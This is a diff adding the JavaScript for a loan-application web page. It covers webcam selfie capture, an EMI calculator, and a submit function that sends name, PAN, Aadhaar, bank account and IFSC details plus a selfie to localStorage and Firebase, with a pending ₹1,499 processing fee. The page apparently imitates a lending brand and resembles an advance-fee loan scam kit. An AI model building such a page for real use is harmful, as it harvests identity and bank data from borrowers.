+        b.className = "toggle-btn border border-gray-300 text-gray-600 py-2.5 rounded-xl text-xs font-semibold";
+      });
+      btn.className = "toggle-btn border border-blue-600 text-[#0b1d3a] bg-blue-50 py-2.5 rounded-xl text-xs font-bold shadow-sm";
+    }
+
+    function getSelectedValue(groupId) {
+      let group = document.getElementById(groupId);
+      if (!group) return "";
+      let activeBtn = group.querySelector('.bg-blue-50');
+      return activeBtn ? activeBtn.getAttribute('data-value') : "";
+    }
+
+    function startCamera() {
+      let video = document.getElementById('camera-stream');
+      let placeholder = document.getElementById('camera-placeholder');
+      let preview = document.getElementById('captured-preview');
+      
+      preview.classList.add('hidden');
+      video.classList.remove('hidden');
+
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+          .then(stream => {
+            mediaStream = stream;
+            video.srcObject = stream;
+            placeholder.classList.add('hidden');
+          })
+          .catch(err => {
+            alert('Camera access denied or unavailable. Please use the file upload option below.');
+          });
+      } else {
+        alert('Camera not supported by this browser. Please use the file upload option.');
+      }
+    }
+
+    function capturePhoto() {
+      let video = document.getElementById('camera-stream');
+      let canvas = document.getElementById('camera-canvas');
+      let preview = document.getElementById('captured-preview');
+      let placeholder = document.getElementById('camera-placeholder');
+
+      if (!mediaStream || video.paused || video.ended) {
+        alert('Please start the camera first or upload an image manually!');
+        return;
+      }
+
+      canvas.width = video.videoWidth || 320;
+      canvas.height = video.videoHeight || 240;
+      let ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      capturedImageData = canvas.toDataURL('image/png');
+
+      preview.src = capturedImageData;
+      preview.classList.remove('hidden');
+      video.classList.add('hidden');
+      placeholder.classList.add('hidden');
+
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+      }
+    }
+
+    function handleImageUpload(event) {
+      let file = event.target.files[0];
+      if (file) {
+        let reader = new FileReader();
+        reader.onload = function(e) {
+          capturedImageData = e.target.result;
+
+          let video = document.getElementById('camera-stream');
+          let preview = document.getElementById('captured-preview');
+          let placeholder = document.getElementById('camera-placeholder');
+
+          video.classList.add('hidden');
+          placeholder.classList.add('hidden');
+          preview.src = capturedImageData;
+          preview.classList.remove('hidden');
+
+          if (mediaStream) {
+            mediaStream.getTracks().forEach(track => track.stop());
+          }
+        };
+        reader.readAsDataURL(file);
+      }
+    }
+
+    function completeApplication() {
+      try {
+        let name = document.getElementById('form-name').value || "Valued Customer";
+        let mobile = document.getElementById('form-mobile').value || "9876543210";
+        let email = document.getElementById('form-email').value || "client@example.com";
+        let amount = document.getElementById('form-amount').value || "50000";
+        let loanType = document.getElementById('form-loantype').value || "Personal Loan";
+        let tenure = document.getElementById('form-tenure').value || "1 Year";
+        let pan = document.getElementById('form-pan').value || "ABCDE1234F";
+        let aadhaar = document.getElementById('form-aadhaar').value || "[Aadhaar Redacted]";
+        let bankName = document.getElementById('form-bankname').value || "SBI";
+        let accountNo = document.getElementById('form-accountno').value || "12345678";
+        let ifsc = document.getElementById('form-ifsc').value || "SBIN0001234";
+
+        let empType = getSelectedValue('emp-group') || "Salaried";
+        let gender = getSelectedValue('gender-group') || "Male";
+        let marital = getSelectedValue('marital-group') || "Married";
+        let accountType = getSelectedValue('account-group') || "Savings Account";
+        
+        let selfie = capturedImageData || "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80";
+        let appId = "DH-" + Math.floor(10000000 + Math.random() * 90000000);
+
+        let newApp = {
+          appId: appId,
+          name: name,
+          mobile: mobile,
+          email: email,
+          amount: amount,
+          loanType: loanType,
+          tenure: tenure,
+          empType: empType,
+          gender: gender,
+          marital: marital,
+          accountType: accountType,
+          pan: pan,
+          aadhaar: aadhaar,
+          bankName: bankName,
+          accountNo: accountNo,
+          ifsc: ifsc,
+          selfie: selfie,
+          avatar: selfie,
+          photo: selfie,
+          image: selfie,
+          status: "Pending",
+          date: new Date().toLocaleDateString(),
+          fullName: name,
+          appNo: appId,
+          statusHeading: "KYC / APPLICATION PENDING",
+          statusDesc: "Your application has been received and is under review.",
+          charges: [{ name: "Processing Fee", amount: "₹1,499", txn: "PENDING" }],
+          papers: [{ title: "Application Form Copy", date: "ISSUE DATE: Today", link: "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" }],
+          uploadedReceipt: ""
+        };
+
+        // Save locally as before
+        let applications = JSON.parse(localStorage.getItem('loanApplications')) || [];
+        applications.push(newApp);
+        localStorage.setItem('loanApplications', JSON.stringify(applications));
+
+        let allClients = JSON.parse(localStorage.getItem('dhani_all_clients')) || [];
+        allClients.push(newApp);
+        localStorage.setItem('dhani_all_clients', JSON.stringify(allClients));
+
+        // Save directly to Firebase Realtime Database
+        if (typeof window.saveToFirebaseDatabase === 'function') {
+          window.saveToFirebaseDatabase(newApp);
+        }
+
+        let dispNameEl = document.getElementById('disp-name');
+        let dispAppIdEl = document.getElementById('disp-appid');
+        if (dispNameEl) dispNameEl.innerText = name;
+        if (dispAppIdEl) dispAppIdEl.innerText = appId;
+        
+        nextApplyStep(6);
+      } catch (e) {
+        console.error(e);
+        nextApplyStep(6);
+      }
+    }
+
+    function calculateEMI() {
+      let p = parseFloat(document.getElementById('calc-amount').value) || 0;
+      let annualRate = parseFloat(document.getElementById('calc-rate').value) || 0;
+      let years = parseFloat(document.getElementById('calc-years').value) || 0;
+      let months = parseFloat(document.getElementById('calc-months').value) || 0;
+
+      let totalMonths = (years * 12) + months;
+      let r = annualRate / 12 / 100;
+
+      if (p > 0 && r > 0 && totalMonths > 0) {
+        let emi = (p * r * Math.pow(1 + r, totalMonths)) / (Math.pow(1 + r, totalMonths) - 1);
+        let totalPay = emi * totalMonths;
+        let totalInt = totalPay - p;
+
+        document.getElementById('res-emi').innerText = '₹ ' + Math.round(emi).toLocaleString('en-IN');
+        document.getElementById('res-interest').innerText = '₹ ' + Math.round(totalInt).toLocaleString('en-IN');
+        document.getElementById('res-total').innerText = '₹ ' + Math.round(totalPay).toLocaleString('en-IN');
+      }
+    }
+  </script>
+
+</body>
+</html>
